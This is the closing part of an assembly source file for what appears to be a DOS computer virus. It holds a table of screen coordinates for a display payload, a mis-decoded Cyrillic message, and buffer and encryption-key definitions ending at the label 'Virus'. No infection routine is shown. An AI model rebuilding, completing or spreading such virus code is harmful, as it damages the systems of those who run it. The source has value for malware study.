           dw  158 + 020 * 320     ;Ž 3
           dw  142 + 025 * 320     ;Ž 4
           dw  158 + 025 * 320     ;Ž 4
           dw  147 + 030 * 320     ;Ž 5
           dw  153 + 030 * 320     ;Ž 5

           dw  170 + 010 * 320     ;‚ 1
           dw  176 + 010 * 320     ;‚ 1
           dw  182 + 010 * 320     ;‚ 1
           dw  170 + 015 * 320     ;‚ 2
           dw  186 + 015 * 320     ;‚ 2
           dw  170 + 020 * 320     ;‚ 3
           dw  176 + 020 * 320     ;‚ 3
           dw  182 + 020 * 320     ;‚ 3
           dw  170 + 025 * 320     ;‚ 4
           dw  186 + 025 * 320     ;‚ 4
           dw  170 + 030 * 320     ;‚ 5
           dw  176 + 030 * 320     ;‚ 5
           dw  182 + 030 * 320     ;‚ 5

           dw  200 + 020 * 320     ;- 3
           dw  206 + 020 * 320     ;- 3
           dw  212 + 020 * 320     ;- 3

           dw  103 + 055 * 320     ;- 6
           dw  109 + 055 * 320     ;- 6
           dw  115 + 055 * 320     ;- 6

           dw  130 + 045 * 320     ;* 6
           dw  136 + 045 * 320     ;* 6
           dw  142 + 045 * 320     ;* 6
           dw  148 + 045 * 320     ;* 6
           dw  130 + 050 * 320     ;* 7
           dw  148 + 050 * 320     ;* 7
           dw  130 + 055 * 320     ;* 8
           dw  148 + 055 * 320     ;* 8
           dw  130 + 060 * 320     ;* 9
           dw  148 + 060 * 320     ;* 9
           dw  130 + 065 * 320     ;* 10
           dw  148 + 065 * 320     ;* 10

           dw  161 + 045 * 320     ;ˆ 6
           dw  179 + 045 * 320     ;ˆ 6
           dw  161 + 050 * 320     ;ˆ 7
           dw  173 + 050 * 320     ;ˆ 7
           dw  179 + 050 * 320     ;ˆ 7
           dw  161 + 055 * 320     ;ˆ 8
           dw  170 + 055 * 320     ;ˆ 8
           dw  179 + 055 * 320     ;ˆ 8
           dw  161 + 060 * 320     ;ˆ 9
           dw  167 + 060 * 320     ;ˆ 9
           dw  179 + 060 * 320     ;ˆ 9
           dw  161 + 065 * 320     ;ˆ 10
           dw  179 + 065 * 320     ;ˆ 10

           dw  197 + 045 * 320     ;„ 6
           dw  203 + 045 * 320     ;„ 6
           dw  209 + 045 * 320     ;„ 6
           dw  197 + 050 * 320     ;„ 7
           dw  209 + 050 * 320     ;„ 7
           dw  197 + 055 * 320     ;„ 8
           dw  209 + 055 * 320     ;„ 8
           dw  191 + 060 * 320     ;„ 9
           dw  197 + 060 * 320     ;„ 9
           dw  203 + 060 * 320     ;„ 9
           dw  209 + 060 * 320     ;„ 9
           dw  215 + 060 * 320     ;„ 9
           dw  191 + 065 * 320     ;„ 10
           dw  215 + 065 * 320     ;„ 10

           dw  231 + 045 * 320     ;Ž 6
           dw  237 + 045 * 320     ;Ž 6
           dw  226 + 050 * 320     ;Ž 7
           dw  242 + 050 * 320     ;Ž 7
           dw  226 + 055 * 320     ;Ž 8
           dw  242 + 055 * 320     ;Ž 8
           dw  226 + 060 * 320     ;Ž 9
           dw  242 + 060 * 320     ;Ž 9
           dw  231 + 065 * 320     ;Ž 10
           dw  237 + 065 * 320     ;Ž 10

           dw  254 + 045 * 320     ;* 6
           dw  260 + 045 * 320     ;* 6
           dw  266 + 045 * 320     ;* 6
           dw  254 + 050 * 320     ;* 7
           dw  270 + 050 * 320     ;* 7
           dw  254 + 055 * 320     ;* 8
           dw  260 + 055 * 320     ;* 8
           dw  266 + 055 * 320     ;* 8
           dw  254 + 060 * 320     ;* 9
           dw  254 + 065 * 320     ;* 10

   CordSize    =   $ - Cord

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ













   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;               „€**›…
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           db  '[ˆ£®àì ‚« ¤. ‚« á®¢ - ¯®¤«ë© « ¬¥à ¨ ¬®à «ìë© ãà®¤]'

   CodeSize    =   $ - Virus

   Temp        dw  0,?
   Header      db  18h dup (?)
   Buffer      db  CodeSize dup (?)
   Key4        db  ?,?

   MemSize     =   $ - Virus

   Code        ends
           end Virus
